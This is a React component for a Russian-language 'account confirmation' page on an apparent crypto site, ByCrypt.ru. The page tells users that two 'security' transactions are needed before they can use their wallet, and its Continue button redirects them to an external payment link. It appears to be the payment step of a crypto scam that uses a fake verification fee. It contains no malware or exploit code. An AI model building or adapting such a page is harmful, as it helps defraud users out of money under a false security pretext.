import React from 'react';
import pic1 from './img/pic1-1.png'
import pic2 from './img/pic1-2.png'
import footbg from './img/footerbg.png'
import {Link} from 'react-router-dom'
import { useDispatch } from 'react-redux';
import { addNewMessage } from './store/chatReducer';


const ConfirmPage = () => {
    const dispatch = useDispatch()
    const userId = localStorage.getItem('userId')

  async function addMessageHandler(event, id, url){
        await dispatch(addNewMessage(id))
        window.location.href = url
    }

  return (
    <div id ="main">
        <div className='header_confirm'>
            <div className="container">
                <div className="header_content">
                   <h1> <a href = "http://bycrypt.ru">ByCrypt.ru</a></h1>
                    <div className="btn">
                        <Link to = "/">Личный кабинет</Link>
                    </div>
                </div>
            </div>
        </div>
        <section>
            <div className="container">
                <div className="section_content">
                    <div className="section_content_left">
                        <div className="section_content_left_text">
                            <h2>Подтверждение счёта</h2>
                            <p>Для подтверждения счёта, в целях безопасности будут производиться две транзакции, на ввод и вывод средств, после этого вы сможете вносить депозиты и выводить средства с вашего электронного кошелька.</p>
                        </div>
                        <div className="section_content_left_btn">
                            <div className="btn">
                                <p onClick={(event)=> addMessageHandler(event, userId, "https://yookassa.ru/my/i/Yi8NOinmPRGm?type=text")}>Продолжить</p>
                            </div>
                        </div>
                    </div>
                    <div className="section_content_right">
                        <div className="img_sub">
                            <img src= {pic1} alt = 'pic1'/>
                        </div>
                        <div className="img_sup">
                            <img src= {pic2} alt = 'pic2'/>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <footer>
            <img src = {footbg} alt = 'footerbg'/>
        </footer>
        
        
            
    </div>
  )
}

export default ConfirmPage;